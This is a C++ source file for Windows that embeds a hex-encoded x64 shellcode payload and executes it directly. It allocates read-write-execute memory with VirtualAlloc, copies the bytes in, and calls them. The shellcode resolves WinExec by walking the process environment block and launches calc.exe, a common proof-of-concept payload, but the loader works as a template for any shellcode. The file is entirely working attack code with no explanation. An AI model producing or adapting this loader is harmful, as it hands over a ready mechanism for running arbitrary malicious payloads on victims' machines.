#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
using namespace std;

unsigned char shellcode[] = "\x48\x89\xE5\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x31\xC0\x65\x4C\x8B\x60\x60\x4D\x8B\x64\x24\x18\x4D\x8B\x64\x24\x20\x4D\x8B\x24\x24\x4D\x8B\x7C\x24\x20\x4D\x8B\x24\x24\x4D\x8B\x64\x24\x20\x4D\x31\xED\x45\x8B\x6C\x24\x3C\x4C\x89\xEA\x4C\x01\xE2\x44\x8B\x2A\x49\x81\xC5\x44\x44\x44\x44\x49\x81\xED\x64\xE6\x3A\x44\x4D\x01\xE5\x48\x31\xC0\x41\x8B\x45\x20\x4C\x01\xE0\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41\x48\x31\xC9\x48\xFF\xC1\x48\x31\xF6\x8B\x34\x88\x4C\x01\xE6\x4C\x39\x0E\x75\xEF\x48\x31\xC0\x41\x8B\x45\x24\x4C\x01\xE0\x66\x8B\x0C\x48\x48\x31\xC0\x41\x8B\x45\x1C\x4C\x01\xE0\x48\x31\xD2\x8B\x14\x88\x4C\x01\xE2\x48\x89\xD7\x48\xB9\x63\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x48\x89\xE2\x4C\x89\xE1\x48\x83\xEC\x30\xFF\xD7\x48\x83\xC4\x30\x48\x83\xC4\x08\x49\x89\xC2\x48\x31\xD2\x52\x48\xB9\x63\x61\x6C\x63\x2E\x65\x78\x65\x51\x48\x89\xE1\x66\xBA\x40\x50\x66\x81\xEA\x3B\x50\x48\x83\xEC\x30\x41\xFF\xD2\x48\x83\xC4\x48\x49\x89\xC6\xB9\x63\x65\x73\x73\x48\xC1\xE9\x08\x51\x48\xB9\x45\x78\x69\x74\x50\x72\x6F\x63\x51\x4C\x89\xE1\x48\x89\xE2\x48\x83\xEC\x30\xFF\xD7\x48\x83\xC4\x30\x48\x83\xC4\x18\x49\x89\xC3\x48\x31\xC9\x41\xFF\xD3";

int main(int argc, int** argv)
{
	void* exec = VirtualAlloc(0, sizeof(shellcode)+1, MEM_COMMIT , PAGE_EXECUTE_READWRITE);
	if (exec)
	{
		printf("statring memcpy...\n");
		memcpy(exec, shellcode, sizeof(shellcode));
		((void(*)())exec)();
	}
	else
	{
		printf("no good");
	}
}


